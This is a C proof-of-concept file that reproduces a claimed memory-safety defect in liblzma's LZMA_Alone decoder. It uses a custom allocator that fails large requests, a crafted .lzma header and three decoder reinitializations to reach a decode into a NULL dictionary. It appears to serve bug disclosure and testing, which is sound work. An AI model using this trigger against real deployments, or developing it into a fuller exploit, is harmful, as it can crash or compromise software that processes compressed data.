// Proof-of-concept for a reachable memory-safety defect in liblzma's
// .lzma (LZMA_Alone) decoder reinitialization path.
//
// Mechanism: lzma_alone_decoder() may be called more than once on the
// same lzma_stream to reuse internal allocations (a documented,
// supported usage pattern). If, on such a reinitialization, the
// dictionary (re)allocation inside the LZ decoder fails (e.g. because
// the application supplied a custom lzma_allocator that returns NULL
// for large requests), the internal LZ-decoder state can be left with
// a stale, non-zero recorded dictionary size while the actual
// dictionary buffer pointer is NULL. A subsequent, otherwise ordinary
// reinitialization that happens to request the same (stale) dictionary
// size will then skip (re)allocating the dictionary buffer entirely
// and proceed to decode directly into the NULL buffer.
//
// This program reproduces that exact call sequence through nothing
// but the public liblzma API (lzma_alone_decoder(), lzma_code(),
// lzma_end()) with in-contract input: a custom allocator (a fully
// supported, documented extension point of lzma_stream) and a tiny,
// well-formed .lzma stream.

#include <lzma.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define MEMLIMIT (16U << 20)
#define TOO_BIG_ALLOC (1U << 20)

static void *
my_alloc(void *opaque, size_t nmemb, size_t size)
{
	(void)opaque;
	(void)nmemb;

	if (size >= TOO_BIG_ALLOC)
		return NULL;

	return malloc(size);
}

static void
my_free(void *opaque, void *ptr)
{
	(void)opaque;
	free(ptr);
}

static lzma_allocator my_allocator = { &my_alloc, &my_free, NULL };

// A minimal, well-formed .lzma (LZMA_Alone) header + a tiny compressed
// payload with an end-of-payload marker and unknown uncompressed size.
//   byte 0:     properties (lc=3, lp=0, pb=2)
//   bytes 1-4:  dictionary size, little-endian (here: 4096 = 4 KiB)
//   bytes 5-12: uncompressed size, little-endian (here: unknown)
//   bytes 13-: compressed data
static const uint8_t small_dict[] = {
	0x5d, 0x00, 0x10, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	0xff, 0xff, 0x00, 0x24, 0x19, 0x49, 0x98, 0x6f, 0x05, 0x15, 0x27,
	0x27, 0x0d, 0x76, 0x78, 0xd0, 0x2a, 0x68, 0x17, 0x15, 0xff, 0xff,
	0x75, 0xf8, 0x00, 0x00,
};

int
main(void)
{
	// Same payload, but with the dictionary size field patched to
	// request an 8 MiB dictionary instead of 4 KiB. The compressed
	// payload bytes don't need to change: decoding never gets far
	// enough to reach them, because the dictionary allocation for
	// this (re)initialization will fail.
	uint8_t big_dict[sizeof(small_dict)];
	memcpy(big_dict, small_dict, sizeof(small_dict));
	big_dict[2] = 0x00;
	big_dict[3] = 0x80;

	uint8_t out[256];

	lzma_stream strm = LZMA_STREAM_INIT;
	strm.allocator = &my_allocator;

	// 1) First initialization: dictionary allocation succeeds (small,
	//    4 KiB request). Decode the tiny stream to completion.
	if (lzma_alone_decoder(&strm, MEMLIMIT) != LZMA_OK)
		return 1;

	strm.next_in = small_dict;
	strm.avail_in = sizeof(small_dict);
	strm.next_out = out;
	strm.avail_out = sizeof(out);
	if (lzma_code(&strm, LZMA_FINISH) != LZMA_STREAM_END)
		return 1;

	// 2) Reinitialize the same lzma_stream (a supported, documented
	//    usage pattern) and request an 8 MiB dictionary this time.
	//    The allocator rejects allocations of this size, so the
	//    dictionary (re)allocation fails and decoding reports
	//    LZMA_MEM_ERROR.
	if (lzma_alone_decoder(&strm, MEMLIMIT) != LZMA_OK)
		return 1;

	strm.next_in = big_dict;
	strm.avail_in = sizeof(big_dict);
	strm.next_out = out;
	strm.avail_out = sizeof(out);
	lzma_code(&strm, LZMA_FINISH);

	// 3) Reinitialize again, this time requesting the original 4 KiB
	//    dictionary (an allocation size the allocator happily
	//    grants). On a correct implementation this works exactly as
	//    the first call did. On the defective tree, internal state
	//    left behind by step 2 causes the decoder to skip allocating
	//    a dictionary buffer altogether and decode directly into a
	//    NULL pointer.
	if (lzma_alone_decoder(&strm, MEMLIMIT) != LZMA_OK)
		return 1;

	strm.next_in = small_dict;
	strm.avail_in = sizeof(small_dict);
	strm.next_out = out;
	strm.avail_out = sizeof(out);
	lzma_code(&strm, LZMA_FINISH);

	lzma_end(&strm);

	return 0;
}
